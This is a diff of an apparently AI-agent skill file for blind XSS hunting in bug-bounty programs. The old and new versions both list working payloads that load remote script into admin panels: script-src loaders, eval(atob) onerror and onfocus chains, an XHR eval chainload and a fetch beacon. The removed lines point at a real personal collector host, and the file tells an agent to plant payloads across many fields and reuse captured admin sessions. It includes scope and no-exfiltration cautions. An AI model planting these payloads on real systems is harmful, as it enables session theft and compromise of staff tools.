@@ -1,144 +1,117 @@
 ---
 name: bxss
-description: "Use when the user is planting blind XSS payloads, or testing fields rendered in admin panels, support tools, log viewers, or any out-of-band JavaScript execution context they cannot directly observe."
+description: "Blind / out-of-band XSS — planting payloads in fields rendered later in admin panels, support tools, log viewers, or any JS execution context you cannot directly observe. Beacons to the harness OOB canary ($AUTOHUNT_OOB)."
 ---
 
-# /bxss - Blind XSS Hunting
+# /bxss — Blind XSS Hunting
 
-> **⚠️ Collector / OPSEC — single source of truth:** every payload below beacons to **your personal blind-XSS collector** `https://js.rip/90utfjxdw5` — a live, attributable endpoint. **Do not push this skill to a public repo** (this toolkit has a `github.com:Liodeus/...` remote); rotate the collector if it leaks. To swap collectors, replace that host throughout — *including the base64-encoded copies in payloads 3–5* (decode → swap → re-encode), which a naive find-replace silently misses.
+> **Collector = your OOB canary.** Every payload below beacons to **`$AUTOHUNT_OOB`** (the canary host
+> the harness exports; see TARGET.md). In the payloads, `OOB_HOST` means *the value of `$AUTOHUNT_OOB`* —
+> substitute it before planting. **If `$AUTOHUNT_OOB` is not set, blind XSS cannot be confirmed
+> autonomously** (you can't watch the admin browser): plant nothing you can't observe, and record the
+> injection point as a **lead** instead. Never hardcode a personal/3rd-party collector here.
 
-You are assisting **Liodeus (YesWeHack)**, whose blind XSS reports come from admin-panel rendering of user-controlled fields: support tickets, signup metadata, HTTP headers logged into dashboards, and webhook payloads echoed in internal tools.
+## Core philosophy
 
-## Core Philosophy
+Blind XSS is a **patience + coverage** game — the payload fires hours/days later in a context you
+never see. Two rules:
+1. **Plant in every field that could be rendered server-side**, with a per-field tag so you know which
+   input fired.
+2. **Use a callback you can read.** Here that's `$AUTOHUNT_OOB`. Confirmation = an observed hit on the
+   canary (poll it if it's an interactsh/oast-style host you can query); otherwise the planted payload
+   is a **lead**, not a proven finding.
 
-Blind XSS is a **patience + coverage** game. The payload fires hours or days later in a context you'll never see. Two rules:
-1. **Plant payloads in every field that could be rendered server-side** — and do it consistently with a tagging scheme so you know which payload fired where.
-2. **Use a callback you control** (XSS Hunter–style server, Burp Collaborator, Project Discovery interactsh) that captures DOM, cookies, URL, screenshot, headers — without these, a fired payload is unprovable.
+## Building the beacon (substitute OOB_HOST = $AUTOHUNT_OOB)
 
-## Payload Strategy — Liodeus's Arsenal
-
-**Active callback:** `https://js.rip/90utfjxdw5` (xss.report-style — auto-captures DOM, cookies, URL, screenshot, headers, fingerprint).
-
-Always plant **multiple payload styles** in the same field — one may be filtered, another may slip through. The base64 blob in payloads 3-5 decodes to: `var a=document.createElement("script");a.src="https://js.rip/90utfjxdw5";document.body.appendChild(a);` — same loader, different injection vector.
-
-### 1. Basic `<script>` tag
-Classic — fires when no script-tag filtering.
+The loader (used by the encoded variants):
 ```
-"><script src="https://js.rip/90utfjxdw5"></script>
+var a=document.createElement('script');a.src='https://OOB_HOST/?t=TAG';document.body.appendChild(a)
 ```
+`TAG` = a short per-field identifier (e.g. `support-subject`). Build the base64 form at runtime so it
+always points at your canary:
+```
+LOADER="var a=document.createElement('script');a.src='https://$AUTOHUNT_OOB/?t=support-subject';document.body.appendChild(a)"
+B64=$(printf '%s' "$LOADER" | base64 -w0)
+```
+Then drop `$B64` into the `atob()` payloads below. (Do NOT ship pre-encoded blobs — they'd pin a stale host.)
 
-### 2. `javascript:` URI
-For URL/link fields, redirect params, href sinks.
-```
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/90utfjxdw5\';document.body.appendChild(a)')
-```
+## Payload arsenal — plant multiple styles per field (one may slip a filter another catches)
 
-### 3. `<input>` autofocus + base64 loader
-Fires when `<input>` + `onfocus` are allowed but `<script>` is stripped.
+### 1. Basic `<script src>` — no script-tag filtering
 ```
-"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><script src="https://OOB_HOST/?t=TAG"></script>
 ```
-
-### 4. `<img onerror>` + base64 loader
-Fires when `<img>` is whitelisted (markdown renderers, sanitizers).
+### 2. `javascript:` URI — URL/link/redirect/href sinks
 ```
-"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+javascript:eval('var a=document.createElement("script");a.src="https://OOB_HOST/?t=TAG";document.body.appendChild(a)')
 ```
-
-### 5. `<video><source onerror>` + base64 loader
-Bypasses sanitizers that miss media-error chains.
+### 3. `<input autofocus>` + base64 loader — `<input>`/`onfocus` allowed, `<script>` stripped
 ```
-"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+"><input onfocus=eval(atob(this.id)) id=$B64 autofocus>
 ```
-
-### 6. `<iframe srcdoc=>` with HTML-entity payload
-Bypasses filters scanning for literal `<script>` — entities decode after parsing.
+### 4. `<img onerror>` + base64 loader — `<img>` whitelisted (markdown/sanitizers)
 ```
-"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/90utfjxdw5&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+"><img src=x id=$B64 onerror=eval(atob(this.id))>
 ```
-
-### 7. XMLHttpRequest inline-execution chainload
-For inline-script-allowed contexts where external `<script src>` is blocked.
+### 5. `<video><source onerror>` + base64 loader — media-error chain
 ```
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/90utfjxdw5");a.send();</script>
+"><video><source onerror=eval(atob(this.id)) id=$B64>
 ```
-
-### 8. jQuery `$.getScript()`
-Smallest payload for jQuery-loaded sites.
+### 6. `<iframe srcdoc>` with HTML-entity-encoded `<script>` — beats literal-`<script>` filters
+   Build srcdoc by HTML-entity-encoding `<script src="https://OOB_HOST/?t=TAG"></script>` and placing it
+   in `"><iframe srcdoc="&#…;">` (entities decode after parsing).
+### 7. XMLHttpRequest inline chainload — inline scripts allowed, external `src` blocked
 ```
-<script>$.getScript("https://js.rip/90utfjxdw5")</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","https://OOB_HOST/?t=TAG");a.send();</script>
 ```
-
-### Tagging per field
-The callback host is fixed, so encode the field/endpoint identifier as a path or query suffix on `js.rip/90utfjxdw5` — e.g. `https://js.rip/90utfjxdw5?t=support-subject-2026-04-29`. When the callback fires, the tag tells you which input → which admin context. For payloads 3-5, modify the loader before base64-encoding to append the tag to `a.src`. Untagged callbacks are useless when 50 payloads are out at once.
-
-### Other styles to try when none of the above fire
-- SVG upload: `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile picture / attachment
+### 8. jQuery `$.getScript()` — smallest, for jQuery sites
+```
+<script>$.getScript("https://OOB_HOST/?t=TAG")</script>
+```
+### Others when none fire
+- SVG upload: `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as avatar/attachment
 - Attribute breakout: `' autofocus onfocus='eval(atob(...))`
-- JS-context escape: `';fetch('//js.rip/90utfjxdw5');//`
-- Markdown / BBCode renderers: `[img]javascript:...[/img]`
-- DOM-clobbering for AngularJS-flavored apps: `<form id=test><input id=attributes>`
+- JS-context escape: `';fetch('//OOB_HOST/?t=TAG');//`
+- Markdown/BBCode: `[img]javascript:...[/img]`
+- DOM-clobbering (AngularJS-ish): `<form id=test><input id=attributes>`
 
-## High-Yield Fields (where bXSS fires)
+### Tagging
+Encode the field/endpoint id in the `?t=` suffix so a fired callback maps back to the input
+(`?t=support-subject`). Untagged callbacks are useless when many payloads are out at once.
 
-### User-controlled fields rendered in admin / staff tools
-* Display name, full name, company, bio, job title (rendered in user lists)
-* Support ticket subject + body
-* Contact form name/email/message
-* Bug reports, feedback forms
-* Order notes, shipping address, billing memo
-* Filename of uploaded files (rendered in file-explorer admin views)
-* Custom fields, tags, labels
-* Profile pictures with SVG payloads (often rendered raw)
-* Webhook URLs (often rendered as clickable links)
+## High-yield fields (where bXSS fires)
 
-### HTTP request fields logged into dashboards
-* `User-Agent` (very common — log viewers render this)
-* `Referer`
-* `X-Forwarded-For` (and any `X-*` header)
-* Request path / query (404 logs, security event logs)
-* Cookie names (rare but seen)
-* Failed-login username (audit logs)
+**User-controlled, rendered in admin/staff tools:** display/full name, company, bio, job title; support
+ticket subject+body; contact/feedback forms; bug reports; order/shipping/billing notes; uploaded
+filename (file-explorer admin views); custom fields/tags/labels; SVG avatars (often rendered raw);
+webhook URLs (rendered as links).
 
-### Indirect / second-order
-* Email addresses with payload in local-part: `"><script src=...>"@example.com`
-* Phone numbers in fields that don't strictly validate
-* Domain names submitted to whitelist forms
-* Referrals / invite codes
+**HTTP fields logged into dashboards:** `User-Agent` (very common), `Referer`, `X-Forwarded-For` and any
+`X-*` header, request path/query (404/security logs), cookie names, failed-login username (audit logs).
 
-## Discovery Methodology
+**Indirect / second-order:** payload in email local-part (`"><script src=...>"@example.com`), loosely
+validated phone numbers, domains submitted to whitelist forms, referral/invite codes.
 
-### Step 1: Callback infra
-**Default callback:** `https://js.rip/90utfjxdw5` — already configured. Auto-captures DOM, cookies, URL, referrer, screenshot, headers, UA. Check the js.rip dashboard for fires.
+## Methodology (autonomous / CLI)
 
-Fallback callbacks if js.rip is unreachable or blocked by target CSP:
-* Burp Collaborator + small JS that beacons cookies/DOM/URL
-* interactsh + custom collector
-* Self-hosted xsshunter-express
+1. **Canary:** confirm `$AUTOHUNT_OOB` is set (TARGET.md). If not → blind XSS is **lead-only**; still log
+   high-value injection points for a human.
+2. **Inventory the input surface** (curl/httpx + JS-bundle mining via the `/xss` techniques). The fields
+   **never echoed back to you** are the prime bXSS candidates (they're echoed *to staff*).
+3. **Plant systematically** with curl — one tagged payload set per field; pass the firewall rate caps
+   from TARGET.md; don't wait between fields.
+4. **Confirm:** if `$AUTOHUNT_OOB` is pollable (interactsh/oast), poll it for hits and correlate the `?t=`
+   tag → input → admin context. An observed hit is the oracle → finding. No observable hit → **lead**.
 
-### Step 2: Inventory the input surface
-Walk the app as a normal user. Every text field, every header, every webhook URL, every uploadable filename — list them. The ones that are **never echoed back to you** are the high-value bXSS candidates (because they're echoed somewhere — to staff).
+## Post-fire (only when you actually observe a callback)
 
-### Step 3: Plant systematically
-One pass per field with a tagged payload set. Move on. Don't wait.
+DOM/cookies/URL/roles may arrive with the hit. Identify the admin app, note an admin session's presence
+(don't abuse it), capture internal URLs (new scope). Use any captured session ONLY to demonstrate
+benign read (whoami/profile), then stop — never exfiltrate real admin data.
 
-### Step 4: Wait + correlate
-Callbacks may take minutes (live admin) to weeks (quarterly review). When one fires, the tag tells you which input → which admin context. Pivot from there.
-
-## Post-Fire: Maximize Impact
-
-When a callback fires from an internal admin context:
-1. Capture the **DOM** — what app is this? Is it Salesforce, Zendesk, custom?
-2. Capture **cookies** — admin session? Use it (carefully, scope-aware) to demonstrate impact
-3. Capture **internal URLs** — these reveal the internal admin domain (often great new scope)
-4. Capture the admin's **roles / permissions** if visible in the DOM
-5. Use the captured admin session ONLY to demonstrate read access on a benign endpoint (whoami / profile). Do not abuse — document scope and stop.
-
-## Key Considerations
-
-* Many programs explicitly scope OUT staff/admin accounts. Read the policy. If admin XSS is in-scope, the impact is often crit; if out-of-scope, you may still get rewarded if the bXSS proves XSS in a customer-facing context (e.g. tenant admin viewing another tenant's data).
-* Never exfiltrate real admin data — capture proof-of-execution (cookie name presence, URL, fingerprint) and stop.
-* Avoid noisy payloads (no `alert()`, no UI-disrupting changes) — silent beacons only.
-* For SVG bXSS: upload `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile pic / file attachment — many image renderers serve SVG inline.
-* If you find one bXSS, look harder at that admin tool — there are usually more sinks in the same UI.
-* Tag your payloads. Untagged callbacks are useless when 50 are out at once.
+## Key considerations
+- Many programs scope OUT staff/admin accounts — read the policy; in-scope admin XSS is often critical.
+- Capture proof-of-execution (callback hit, cookie *name* presence, URL, fingerprint) — never bulk data.
+- Silent beacons only — no `alert()`/UI-disrupting payloads in someone else's admin panel.
+- One bXSS in an admin tool → look harder; the same UI usually has more sinks.
+- Reporting/Discord are the orchestrator's job — you write the report via `/report-yeswehack` only.
